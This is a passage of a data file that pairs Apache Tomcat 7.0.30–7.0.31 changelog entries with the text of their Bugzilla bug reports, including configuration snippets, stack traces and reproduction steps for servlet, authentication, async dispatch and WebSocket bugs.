multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

and the character encoding should be set to default (ISO-8859-1)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52811
Catalina|Tomcat 7.0.31 (markt)|fix|53854|Make directory listings work correctly when aliases are used. (markt)|DefaultServlet directory listings for aliased directories do not seem to work|"The following situation does not seem to work.

1.) In a Context, add an alias to a directory.
2.) Enable directory listings on the DefaultServlet.
3.) Try to view the directory listing of the alias directory.

Example:

conf/context.xml:

  <Context aliases=""/files=/my/downloads"">
  ...
  </Context>

conf/web.xml:

    ...
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>true</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    ...

contents of the directory ""/my/downloads"":

  -rw-r--r--@ 1 daniel  staff  8156824 Sep 10 09:15 apache-tomcat-7.0.30.zip

URL works:

http://localhost:8080/files/apache-tomcat-7.0.30.zip

URL does not work:

http://localhost:8080/files/

The URL that does not work fails with the error:

SEVERE: Servlet.service() for servlet [default] in context with path [/] threw exception [Error accessing resource] with root cause
javax.naming.NameNotFoundException: Resource /files/ not found
	at org.apache.naming.resources.FileDirContext.list(FileDirContext.java:303)
	at org.apache.naming.resources.ProxyDirContext.list(ProxyDirContext.java:512)
	at org.apache.catalina.servlets.DefaultServlet.renderHtml(DefaultServlet.java:1458)
	at org.apache.catalina.servlets.DefaultServlet.render(DefaultServlet.java:1254)
	at org.apache.catalina.servlets.DefaultServlet.serveResource(DefaultServlet.java:951)
	at org.apache.catalina.servlets.DefaultServlet.doGet(DefaultServlet.java:412)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53854
Jasper|Tomcat 7.0.31 (markt)|code|53713|Performance improvement of up to four times faster parsing of JSP pages. Patch provided by Sheldon Shao. (markt)|Performance tuning solution for JspReader|"Created attachment 29223 [details]
patch for JspReader.java

mark() is called so many times when doing JSP or tag files compilation.
This can be reduced by a little bit code changes.

Attached files contain this solution."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53713
Cluster|Tomcat 7.0.31 (markt)|add||Make the cluster members and the cluster deployer associated with the cluster accessible via JMX. (markt)|||
Cluster|Tomcat 7.0.31 (markt)|fix||Fix a behavior of TcpPingInterceptor#useThread. If set to false, ping thread is never started. (kfujino)|||
Web applications|Tomcat 7.0.31 (markt)|add||Improve the documentation web application to clarify the difference between the tag and version parameters when using text interface of the Manager web application. (markt)|||
Web applications|Tomcat 7.0.31 (markt)|add||Make sessions saved in the Store associated with a Manager that extends PersistentManager optionally visible (via the showProxySessions Servlet initialisation parameter in web.xml) to the Manager web application. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|fix||Automatically delete temporary files used by Servlet 3.0 file upload (for parts which size is greater than file-size-threshold option in web.xml) when request processing completes. (kkolinko)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53071|This additional fix for this issue improves the formatting of Jasper errors (or any exceptions that use a multi-line message) with the ErrorReportValve. (markt)|ErrorReportValve ignores message from throwable|"When setting

> request.setAttribute(Globals.EXCEPTION_ATTR, e);
> response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);

in a server-side component the throwable#getMessage is completely ignored and only the stacktrace is shown. Message is not retrieved. Line 161 has to be simply replaced with

> if (throwable != null)
>   message = RequestUtil.filter(throwable.getMessage());
> else
>   message = RequestUtil.filter(response.getMessage());

The throwable message is nicely displayed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53071
Catalina|Tomcat 7.0.30 (markt)|fix|53469|If a URL passed to javax.servlet.http.HttpServletResponse.encodeURL() cannot be made absolute, never encode it and return it unchanged. Previously, the fix for 53062 meant than an IllegalArgumentException was thrown. (markt)|possible bug in Response.normalize(CharChunk cc)|"The Response.normalize(CharChunk cc) introduced in 7.0.28 introduced a bug.
See Bug ID 53062

The URL that is being encoded is:
../../resources/org.apache.wicket.markup.html.WicketEventReference/wicket-event.js?w:lm=1340711670
which causes a IllegalArgumentException in this method

java.lang.IllegalArgumentException
	at org.apache.catalina.connector.Response.normalize(Response.java:1799)
	at org.apache.catalina.connector.Response.toAbsolute(Response.java:1732)
	at org.apache.catalina.connector.Response.encodeURL(Response.java:1242)
	at org.apache.catalina.connector.ResponseFacade.encodeURL(ResponseFacade.java:406)
	at org.apache.wicket.protocol.http.WebResponse.encodeURL(WebResponse.java:149)
	at org.apache.wicket.protocol.http.request.WebRequestCodingStrategy.encode(WebRequestCodingStrategy.java:387)

Running the same application in tomcat 7.0.27 and 6.0.18 works without issue"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53469
Catalina|Tomcat 7.0.30 (markt)|fix|53481|Added support for SSLHonorCipherOrder to allow the server to impose its cipher order on the client. Based on a patch provided by Marcel ≈†ebek. This feature requires Tomcat Native 1.1.25 or later. (schultz)|Support SSL_OP_CIPHER_SERVER_PREFERENCE / SSLHonorCipherOrder|"Currently, Tomcat Native does not have an equivalent of the mod_ssl SSLHonorCipherOrder directive and is thus vulnerable to the SSL BEAST attack.

See http://httpd.apache.org/docs/current/mod/mod_ssl.html#sslhonorcipherorder for the docs on this directive, and https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls on why and how it mitigates the BEAST attack.

Please incorporate an option named SSLHonorCipherOrder that sets the OpenSSL option SSL_OP_CIPHER_SERVER_PREFERENCE

P.S., not sure whether to qualify this as bug or enhancement, but since it concerns a security issue I filed it as a bug.

P.S.2, I'm willing to create a patch myself, but since I don't have an Tomcat Native build env that will probably take some time... It's a really small change."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53481
Catalina|Tomcat 7.0.30 (markt)|fix|53498|Fix atomicity bugs in use of concurrent collections. Based on a patch by Yu Lin. (markt)|Atomicity violation bugs because of misusing concurrent collections|"Created attachment 29021 [details]
The patch that may fix the atomicity violation bugs.

My name is Yu Lin. I'm a Ph.D. student in the CS department at
UIUC. I'm currently doing research on mining Java concurrent library
misusages. I found some misusages of ConcurrentHashMap in Tomcat
7.0.28, which may result in potential atomicity violation bugs or harm
the performance.

The code below is a snapshot of the code in file
java/org/apache/catalina/core/ApplicationContext.java from line 761 to
767 and line 1262 to 1266

L761        found = attributes.containsKey(name);
L762        if (found) {
L763            value = attributes.get(name);
L764            attributes.remove(name);
L765        } else {
L766            return;
L767        }
            ...
L1262       if (parameters.containsKey(name)) {
L1263           return false;
L1264       }
L1265
L1266       parameters.put(name, value);

In the code above, an atomicity violation may occur between lines 762
and 763. Suppose thread T1 executes line 761 and finds that the
concurrent hashmap ""attributes"" contains the key ""name"". Before thread
T1 executes line 763, another thread T2 removes the ""name"" key from
""attributes"". Now thread T1 resumes execution at line 763 and will get
a null value for ""name"". Then the next line will throw a
NullPointerException when invoking the method on ""name"".

Second, the snapshot above has another atomicity violation. Let's look
at lines 1262 and 1266. Suppose a thread T1 executes line 1262 and
finds out the concurrent hashmap dose not contain the key
""name"". Before it gets to execute line 1266, another thread T2 puts a
pair <name, v> in the concurrent hashmap ""parameters"". Now thread T1
resumes execution and it will overwrite the value written by thread
T2. Thus, the code no longer preserves the ""put-if-absent"" semantics.

I found some similar misusages in other files:

In java/org/apache/catalina/ha/context/ReplicatedContext.java, similar
atomicity violation may occur when another thread T2 remove the key
""name"" from concurrent hashmap ""tomcatAttributes"" before thread T1
executes line 172.

In java/org/apache/catalina/startup/HostConfig.java, suppose thread T1
executes line 1480 and finds out the concurrent hashmap dose not
contain the key ""contextName"". Before it executes line 1509, another
thread T2 puts a pair <contextName, v> in the concurrent hashmap
""deployed"". Now thread T1 resumes execution and it will overwrite the
value written by thread T2. Indeed, the putIfAbsent method shoule be
used rather than put method at line 1509."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53498
Catalina|Tomcat 7.0.30 (markt)|fix||Correct a regression in the previous fix for 53062 that did not always correctly normalize redirect URLs when the redirect URL included a query string or fragment component. (markt)|Tomcat doesn't normalize absolute urls for redirect|"Created attachment 28582 [details]
A demo app that demonstrates the problem. Issue a request to /serv1 and check the produced 'Location' response header

Issuing a redirect like:

  response.sendRedirect(""./serv2"");

will lead to a response header like:

  Location:http://localhost:8080/./serv2

and this causes problems for some not that smart user agents like Internet Explorer and JMeter.

The problem has been reported few times in Apache Wicket's Jira.
Wicket works only with relative urls and lets the web container to make them absolute when a redirect is needed. But it seems only Tomcat produces absolute urls with '../' and/or './' inside and let the user agent to normalize them. Other web containers normalize the url at the server side and make user agents life easier.

See 
https://issues.apache.org/jira/browse/WICKET-2732
https://issues.apache.org/jira/browse/WICKET-4260"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53062
Catalina|Tomcat 7.0.30 (markt)|fix||Add missing getter and setter for roleSearchAsUser option on JNDI Realm. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|update||Add some HTTP status codes registered at IANA. (rjung)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53531|Fix ExpandWar.expand to check the return value of File.mkdir and File.mkdirs. (schultz)|ExpandWar.expand does not check the return value of File.mkdir and File.mkdirs|"http://markmail.org/message/fvyxksx7muk3icr4

o.a.c.startup.ExpandWar.expand() calls File.mkdirs on line 165 and does not check the return value. If the call fails, a subsequent attempt to create a new FileOutputStream for a file in the (failed-to-create) directory results in a FileNotFoundException with the whole filename as the message. Here is an example from the above tomcat-user original post:

SEVERE: Exception fixing docBase: {0}
    java.io.FileNotFoundException:
/home/surgnet/public_html/sample/META-INF/MANIFEST.MF (No such file or
directory)
            at java.io.FileOutputStream.open(Native Method)
            at java.io.FileOutputStream.<init>(FileOutputStream.java:194)
            at java.io.FileOutputStream.<init>(FileOutputStream.java:145)
            at org.apache.catalina.startup.ExpandWar.expand(ExpandWar.java:457)
            at org.apache.catalina.startup.ExpandWar.expand(ExpandWar.java:173)

This is confusing to users because the real issue has been hidden: the inability to create the parent directory for the file.

The analogous code in the current trunk is:

                    if (!parent.mkdirs() && !parent.isDirectory()) {
                        throw new IOException(
                                sm.getString(""expandWar.createFailed"", parent));
                    }

I believe this is the correct approach, which should be adopted for Tomcat 5.5."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53531
Catalina|Tomcat 7.0.30 (markt)|fix|53535|Reduce memory footprint when performing class scanning on Context start. Patch provided by Cedomir Igaly. (markt)|Out of memory while performing ContextConfig.webConfig|"Created attachment 29047 [details]
Suggested solution to improve ContextConfig

JavaClassCacheEntry objects are using too much memory causing eventually (all kinds of) out of memory errors during container startup. There is no need to save whole JavaClass in cache since only superclass name and interface names are needed in later processing.

Suggested solution is attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53535
Catalina|Tomcat 7.0.30 (markt)|fix|53541|Fix JAR scanning when WEB-INF/lib is provided via VirtualDirContext. Patch provided by Philip Zuev. (markt)|"Bug in virtual webapp feature. Custom tags badly supported. Error is ""org.apache.jasper.JasperException: The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application"""|"Defect report - briefly:
Tomcat implements ‚Äúvirtual webapp‚Äù feature. For details, see http://tomcat.apache.org/tomcat-7.0-doc/config/context.html#Virtual_webapp
Tomcat 7.0.28 implementation of ‚Äúvirtual webapp‚Äù has a defect ‚Äì it does not allow developer to use tag library from WEB-INF/lib/*.jar. For example, developer can‚Äôt put well known jstl-1.2.jar into WEB-INF/lib/ and use it.

Defect report ‚Äì detailed:
Proof of concept web application - lite-filter-mdot-1.0.0-BUILD-SNAPSHOT-sources.jar. Really, it‚Äôs a sample web app downloaded from Spring Source.  You can download it from https://github.com/SpringSource/spring-mobile-samples. I just changed POM a little bit to remove redundant samples.

Error screenshot ‚Äì error.png

Zipped tomcat CONF directory ‚Äì defect-conf.zip
======From Spring.xml========
<Context path=""/spring"" docBase=""C:/Users/Filipp_Zuev/workspace/lite-filter-mdot/src/main/webapp"" >
  <Resources className=""org.apache.naming.resources.VirtualDirContext""
    extraResourcePaths=
      ""/WEB-INF/classes=C:/Users/Filipp_Zuev/workspace/lite-filter-mdot/target/classes,/WEB-INF/lib=C:/Users/Filipp_Zuev/workspace/lite-filter-mdot/target/lite-filter-mdot-1.0.0-BUILD-SNAPSHOT/WEB-INF/lib"" />
  <Loader className=""org.apache.catalina.loader.VirtualWebappLoader""
    virtualClasspath=""C:/Users/Filipp_Zuev/workspace/lite-filter-mdot/target/classes;
      C:/Users/Filipp_Zuev/workspace/lite-filter-mdot/target/lite-filter-mdot-1.0.0-BUILD-SNAPSHOT/WEB-INF/lib/*.jar"" />
  <JarScanner scanAllDirectories=""true"" />
</Context>
=============
Tomcat log file - catalina.2012-07-12.log

Defect‚Äìfix suggested:
Add this method to org.apache.naming.resources.VirtualDirContext
@Override
	protected String doGetRealPath(String path) {
        File file = file(path);
        if(null!=file){
        	return file.getAbsolutePath();
        }else{
        	return null;
        }
    }

Defect‚Äìfix suggested-proof of concept:
1.	Deploy attached tomcat-extension-0.0.1-SNAPSHOT.jar with me.tomcat.bugfix.workaround.VirtualDirContext.class into Tomcat‚Äôs common lib directory.
2.	In the Context configuration for the proof of concept application replace org.apache.naming.resources.VirtualDirContext for me.tomcat.bugfix.workaround.VirtualDirContext
3.	Restart tomcat. 
Defect fixed!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53541
Catalina|Tomcat 7.0.30 (markt)|fix|53574|Ensure Servlets defined using jsp-file are available when metadata-complete is true. (markt)|"metadata-complete=""true"" and servlet defined as jsp not working"|"We have a servlet defined as 

<servlet>
        <servlet-name>VersionInfoServlet</servlet-name>
        <jsp-file>/WEB-INF/svnrevision.jsp</jsp-file>
</servlet>

and mapped as 

<servlet-mapping>
        <servlet-name>VersionInfoServlet</servlet-name>
        <url-pattern>/svnrevision</url-pattern>
</servlet-mapping>



It worked fine. Then we changed metadata-complete to ""true"", and from now on we receive 

INFO: Marking servlet VersionInfoServlet as unavailable
lip 20, 2012 11:05:36 AM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Allocate exception for servlet VersionInfoServlet
javax.servlet.ServletException: No servlet class has been specified for servlet VersionInfoServlet
        at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1130)
        at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:857)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:136)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
        at org.apache.coyote.ajp.AjpNioProcessor.process(AjpNioProcessor.java:184)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53574
Catalina|Tomcat 7.0.30 (markt)|fix|53584|Ignore path parameters when comparing URIs for FORM authentication. This prevents users being prompted twice for passwords when logging in when session IDs are being encoded as path parameters. (markt)|Forms authentication without cookies requires double submission in 6.0.33|"Created attachment 29093 [details]
Standalone test app which reproduces the issue

We have an application which uses the forms authentication provided by Servlet specification and is configured store session IDs in the URL rather than using cookies. This configuration has been working as expected under Tomcat 6.0.32 and earlier.

On upgrading to Tomcat 6.0.33 or 6.0.35 this combination no longer works as expected. Specifically, when a user initially submits the login form they are immediately returned back to the form-login-page. Submitting the login form a second time allows them to log in. The only difference I have been able to spot between the first and second form submission is for the second submission the request attribute ""javax.servlet.forward.request_uri"" now has the jsessionid appended to the URL.

Attached is a standalone WAR which reliably reproduces the problem with 6.0.33 and 6.0.35. Steps to reproduce:

1) Unpack tomcat 6.0.33. I used windows version ""apache-tomcat-6.0.33-windows-x86.zip"".
2) Drop forms-auth-test.war into the webapps directory.
3) Disable cookies by editing conf/context.xml:
<Context cookies=""false"">
    ....
</Context>

4) Add a user to authenticated with to conf/tomcat-users.xml:
<tomcat-users>
  <role rolename=""tomcat""/>
  <user username=""tomcat"" password=""tomcat"" roles=""tomcat""/>
</tomcat-users>

5) Launch tomcat, I used ""bin/catalina.bat start"".
6) Navigate to http://localhost:8080/forms-auth-test/index.jsp
7) Enter user:tomcat pass:tomcat (should be prefilled). Click login.
8) Observe that you are returned to the login page (with a session ID in the URL this time).
9) Enter the username and password again and click login.
10) Login should succeed this time.


Environment details:
- Windows 7 64-bit, Oracle JVM 1.6.0u32 & 1.7.0u4.
- Debian 5 32-bit, Oracle JVM 1.6.0u32.

Relevant tomcat-user mailing list thread: http://tomcat.markmail.org/thread/kywykrrjvwuavndp"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53584
Catalina|Tomcat 7.0.30 (markt)|fix|53623|When performing a asynchronous dispatch after series of forwards, ensure that the request properties are correct for the request at each stage. (markt)|Incorrect request properties after AsyncContext.dispatch|"In a scenario that involves a forward, a call to startAsync, and then dispatch(path), the properties of the request after the dispatch do not match the path and query params used to send the dispatch.

A project demonstrating the issue:
https://github.com/rstoyanchev/dispatch-test

Build and deploy the sources in the 'tomcat-issue-repro' branch. From the home page of the deployed application, select the ""Dispatch via AsyncContext"" scenario. 

The scenario involves a couple of forwards from ServletA to Servlet B and then ServletC, which in turn starts a thread and dispatches to Servlet D that forwards to a JSP. See WebAppInitializer.setupDispatchScenario(ServletContext) for details on the setup.

The log output shows the content of the request as each Servlet is entered. It all looks as expected until after the dispatch to ServletD where the requestUri, servletPath, and pathInfo are for ServletC.

---

The second scenario on the home page, ""Dispatch via AsyncContext and wrap request"", wraps the request and that yields slightly different (but also incorrect) results. The requestUri/servletPath/pathInfo and also the parameterMap, in the application thread and after dispatch, both match the state of the request in ServletA.

---

FWIW there are also a couple of similar scenarios that use forwarding instead of dispatching. The ""Forward via RequestDispatcher"" scenario appears to work all the way through while the ""Forward via RequestDispatcher and wrap request"" almost works except the state of the request in the async thread only matches that of ServletA."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53623
Catalina|Tomcat 7.0.30 (markt)|fix|53624|Ensure that HttpServletResponse.sendRedirect() works when called after a dispatch from an AsyncContext. (markt)|sendRedirect doesn't work after a dispatch through the AsyncContext|"A call to sendRedirect after AsyncContext.dispatch doesn't redirect and returns with a 200 status code instead.

A project demonstrating the issue:
https://github.com/rstoyanchev/dispatch-test

Build and deploy the source in the 'tomcat-issue-repro'. From the home page of the deployed application, select the ""Redirect"" scenario. The scenario involves Servlet ""RedirectA"" that creates a thread and dispatches to Servlet ""RedirectB"", which in turn redirects to Servlet ""RedirectC"" and that forwards to a simple JSP page. Instead of the JSP page rendering, you should see a blank page and the log output will show that processing ended at ServletC.

For details on the setup see WebAppInitializer.setupRedirectScenario(ServletContext).

---

FWIW if a forward is used instead of a dispatch from the async thread, the scenario works. To do that, modify the line that creates servlet ""RedirectA"" to be ForwardingAsyncServlet instead of DispatchingAsyncServlet.

---

This issue is very similar to 51197, which was marked resolved in 7.0.25. The current issue was tested against 7.0.29."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53624
Catalina|Tomcat 7.0.30 (markt)|fix|53641|Correct name of HTTP header used in WebSocket handshake for listing the preferred protocols. (markt)|Wrong websocket's subprotocol implementation|"According to RFC6455 Section 4.3. the handling of subprotocol requests is not correct.
It must be checked for ""Sec-WebSocket-Protocol"" instead of ""Sec-WebSocket-Protocol-Client"" in WebSocketServlet class."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53641
Catalina|Tomcat 7.0.30 (markt)|code||Document the constants that were added to the RequestDispatcher interface in Servlet 3.0. (kkolinko)|||
Catalina|Tomcat 7.0.30 (markt)|fix||Ensure custom error pages are not truncated if the page that triggered the error set a content length header. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53677|Ensure that a 500 response rather than no response is returned if the HTTP headers exceed the size limit. (markt)|ArrayIndexOutOfBoundsException when response header exceeds maxHttpHeaderSize|"Created attachment 29184 [details]
Small sample web app

When a servlet adds enough information to a response exceed the maxHttpHeaderSize limitconfigured for an HTTP 1.1 connector, an ArrayIndexOutOfBoundsException is thrown by Tomcat (example stacktrace below), and the connection is closed without writing any data.

In a scenario like this, should a response with a status of 500 be returned to indicate a server error? (and perhaps the server should log a message indicating that the limit has been exceeded for a response, instead of throwing an ArrayIndexOutOfBoundsException?)



This issue can be reproduced by testing with a servlet that implements this contrived doGet method (sample application with this is attached):

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		char[] bigBuffer = new char[1024 * 8];
		Arrays.fill(bigBuffer, 'a');
		response.setHeader(""x-example"", new String(bigBuffer));
		
		response.setContentType(""text/plain"");
		response.setCharacterEncoding(""ISO-8859-1"");

		Writer out = response.getWriter();
		out.write(""Hello!"");
		out.close();
	}


This has been observed under the following configurations:

Tomcat 6.0.26/Oracle JDK 1.6.0_25 (64-bit)/SUSE Linux 10
Tomcat 6.0.35/Oracle JDK 1.7.0 (64-bit)/Windows 7

- Tomcat is not running behind a web server in any of these configurations

- The connector being used in both cases is Coyote HTTP/1.1




Stacktrace:

Aug 07, 2012 6:11:26 PM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet SampleServlet threw exception
java.lang.ArrayIndexOutOfBoundsException: 8192
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:730)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:641)
	at org.apache.coyote.http11.InternalOutputBuffer.sendHeader(InternalOutputBuffer.java:514)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1637)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:183)
	at org.apache.coyote.Response.sendHeaders(Response.java:379)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:314)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:274)
	at org.apache.catalina.connector.CoyoteWriter.close(CoyoteWriter.java:108)
	at com.example.SampleServlet.doGet(SampleServlet.java:36)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)

Aug 07, 2012 6:11:26 PM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet SampleServlet threw exception
java.lang.ArrayIndexOutOfBoundsException: 8192
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:730)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:641)
	at org.apache.coyote.http11.InternalOutputBuffer.sendHeader(InternalOutputBuffer.java:514)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1637)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:183)
	at org.apache.coyote.Response.sendHeaders(Response.java:379)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:314)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:274)
	at org.apache.catalina.connector.CoyoteWriter.close(CoyoteWriter.java:108)
	at com.example.SampleServlet.doGet(SampleServlet.java:36)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)

Aug 07, 2012 6:11:26 PM org.apache.coyote.http11.Http11Processor process
SEVERE: Error processing request
java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:701)
	at org.apache.coyote.http11.InternalOutputBuffer.sendStatus(InternalOutputBuffer.java:438)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1624)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:183)
	at org.apache.coyote.Response.sendHeaders(Response.java:379)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:314)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:274)
	at org.apache.catalina.connector.Response.finishResponse(Response.java:493)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:317)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)

Aug 07, 2012 6:11:26 PM org.apache.coyote.http11.Http11Processor process
SEVERE: Error processing request
java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:701)
	at org.apache.coyote.http11.InternalOutputBuffer.sendStatus(InternalOutputBuffer.java:438)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1624)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:183)
	at org.apache.coyote.Response.sendHeaders(Response.java:379)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:314)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:274)
	at org.apache.catalina.connector.Response.finishResponse(Response.java:493)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:317)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)

Aug 07, 2012 6:11:26 PM org.apache.coyote.http11.Http11Processor process
SEVERE: Error finishing response
